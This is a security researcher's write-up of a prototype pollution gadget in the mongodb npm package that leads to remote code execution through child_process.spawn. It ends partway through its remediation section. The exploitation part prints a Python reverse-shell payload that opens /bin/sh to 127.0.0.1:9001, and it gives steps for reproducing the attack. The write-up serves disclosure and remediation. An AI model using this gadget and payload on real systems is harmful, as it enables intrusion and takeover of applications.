---
title: Brand-new prototype pollution gadget in MongoDB leading to RCE
url: https://infosecwriteups.com/brand-new-prototype-pollution-gadget-in-mongodb-leading-to-rce-8c5e0087c15e?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2024-07-02
fetch_date: 2025-10-06T17:42:33.991244
---

# Brand-new prototype pollution gadget in MongoDB leading to RCE

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F8c5e0087c15e&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fbrand-new-prototype-pollution-gadget-in-mongodb-leading-to-rce-8c5e0087c15e&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fbrand-new-prototype-pollution-gadget-in-mongodb-leading-to-rce-8c5e0087c15e&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-8c5e0087c15e---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-8c5e0087c15e---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# Brand-new prototype pollution gadget in MongoDB leading to RCE

[![Vuusale](https://miro.medium.com/v2/da:true/resize:fill:64:64/0*C6o6PKl-cTAIyc7g)](https://medium.com/%40vuusale?source=post_page---byline--8c5e0087c15e---------------------------------------)

[Vuusale](https://medium.com/%40vuusale?source=post_page---byline--8c5e0087c15e---------------------------------------)

4 min read

·

Jun 17, 2024

--

Listen

Share

Recently, I uncovered a new prototype pollution gadget in *mongodb* NPM package version 6.6.2, that results in Remote Code Execution (RCE). Despite the excitement of this discovery, my report was closed as “informative” because its exploitation depends on the application using this library. Regardless, I want to share the specifics of my finding, its implications, and why I believe it warrants more attention. The package is still vulnerable, therefore application developers should be made aware of it, even though it can also be abused for evil purposes!

## What is prototype pollution?

Prototype pollution is a JavaScript-specific vulnerability that allows to inject arbitrary properties into global object prototype. If these properties are later used by the application in unsafe ways, it can open up an opportunity for other types of attacks such as authentication bypass, XSS, and even RCE. For more details, check [Portswigger’s article](https://portswigger.net/web-security/prototype-pollution) about this topic.

To be able to obtain RCE with prototype pollution, we need 3 components:

* **Sink** — a dangerous JavaScript function that executes arbitrary code. For example, *eval*, *child\_process.exec*, etc.
* **Gadget** — a property passed into a sink without sanitization.
* **Source** — an entry point to the application for polluting the prototype with vulnerable property.

Even when a web application has a prototype pollution source, this vulnerability alone does not constitute any risk unless it can be combined with a valid gadget and sink to create a significant impact. The trick here is that gadget and sink don’t have to reside in the application’s own code base, but can also arise in its dependencies. We just need to pollute properties that are handled insecurely somewhere for escalating to other vulnerabilities.

![Prototype pollution components]()

Prototype pollution

### Discovery

To discover the prototype pollution gadget in *mongodb* NPM library, I first pinpointed the dangerous sink, then traced back its arguments to determine potential gadgets. It exists within the *mongodb/lib/client-side-encryption/mongocryptd\_manager.js* file, responsible for client-side encryption of specific data fields:

Press enter or click to view image in full size

![Vulnerable sink]()

Vulnerable sink

In line 37, *cmdName* and *this.spawnArgs* arguments are passed into *spawn* function imported from *child\_process* library. *cmdName* variable is declared in line 32 with the value of *this.spawnPath*. Let’s analyze where these properties come from.

Press enter or click to view image in full size

![Vulnerable gadgets]()

Vulnerable gadgets

In line 16, we see that *this.spawnPath* is set to *extraOptions.mongocryptdSpawnPath* or empty string. In line 19, *extraOptions.mongocryptdSpawnArgs* is used to populate *this.spawnArgs* array. The class constructor doesn’t check whether these properties exist in *extraOptions* object before referencing them. That’s why, the application will search for those properties in the global object prototype, if it doesn’t find them in *extraOptions* object. That creates a useful gadget to reach *spawn* call with prototype pollution, enabling us to run any binary with arbitrary options.

### Exploitation

To simulate a prototype pollution exploit, I set up an example Node.js application that creates a MongoDB database connection with client-side encryption: <https://pastebin.com/YAewQa3f>

The following lines pollutes the prototype before *MongoClient* class is initialized:

```
autoEncryption.__proto__.mongocryptdSpawnPath = "python";
autoEncryption.__proto__.mongocryptdSpawnArgs = ['-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'];
```

*mongocryptdSpawnPath* property specifies the binary to be run, while *mongocryptdSpawnArgs* indicates CLI arguments. The result:

Press enter or click to view image in full size

![]()

Reverse shell

As you can see, “ — idleShutdownTimeoutSecs” and “60” arguments were also appended to the executed command by the library. This might cause unknown option error with some binaries such as curl. To get around this issue, I added “-d” option after URL which turns this dangling option to the request’s body and prevents the exploit from failing:

![]()

Workaround for dangling option

Overall steps:

1. Install *mongodb* and *mongodb-client-encryption* packages: `npm install mongodb mongodb-client-encryption`.
2. Create netcat listener.
3. Run the Node.js program.

Alternatively, follow the steps here to pull and run the fully-setup docker image for this exploit: <https://github.com/vuusale/proto-gadget-mongodb>

Whenever you encounter a prototype pollution in a Node.js application using MongoDB, you can easily set the properties described above and achieve RCE.

### Remediation

Although MongoDB refused to award a bounty for this finding, I chose not to debate with the HackerOne team about why MongoDB should take responsibility for fixing this vulnerability instead of placing all the burden on developers using the library. Instead, I rolled up my sleeves, implemented a patch, and created a pull request in their Github repository. The simple solution I proposed is the following:

Press enter or click to view image in full size

![Solution to avoid null reference]()

Solution to avo...